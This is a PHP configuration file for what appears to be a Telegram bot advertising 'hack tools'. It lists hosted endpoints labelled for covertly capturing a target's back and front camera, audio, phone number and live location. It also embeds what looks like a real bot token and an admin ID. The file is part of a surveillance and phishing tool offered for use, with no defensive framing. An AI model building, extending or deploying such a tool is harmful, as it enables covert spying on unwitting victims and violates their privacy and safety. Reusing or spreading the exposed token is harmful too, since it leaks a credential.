<?php
// ============= BOT CONFIGURATION =============
define('BOT_TOKEN', '8972741594:AAESftkJp-DFaabRQZrk34zxMsUQyMujT2E');
define('ADMIN_ID', 8381916527);

// API Endpoints for Hack Tools
$APIS = [
    'BACK_CAM'  => 'https://aslisdgcam.vercel.app',
    'FRONT_CAM' => 'https://aslisd-front-cam.vercel.app',
    'AUDIO'     => 'https://alsdjsk-audio-hack.vercel.app',
    'NUMBER'    => 'https://aslis-number.vercel.app',
    'LOCATION'  => 'https://aslis-live-location.vercel.app'
];

// Banner Images
$IMAGES = [
    'MAIN'    => 'https://iili.io/Bp1CVhg.png',
    'WELCOME' => 'https://iili.io/Bp1CVhg.png',
    'SUCCESS' => 'https://iili.io/Bp1CVhg.png'
];

// Database path for Vercel (temporary storage)
define('DB_PATH', '/tmp/bot_data.db');
?>
